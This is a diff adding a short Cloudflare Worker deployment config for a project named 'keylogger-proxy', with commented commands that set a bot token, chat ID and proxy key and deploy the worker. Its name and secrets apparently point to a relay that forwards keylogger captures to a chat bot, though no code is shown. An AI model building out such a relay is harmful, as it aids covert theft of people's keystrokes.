@@ -1,0 +1,9 @@
+name = "keylogger-proxy"
+main = "worker.js"
+compatibility_date = "2024-01-01"
+workers_dev = true
+
+# npx wrangler secret put BOT_TOKEN
+# npx wrangler secret put CHAT_ID
+# npx wrangler secret put PROXY_KEY
+# npx wrangler deploy
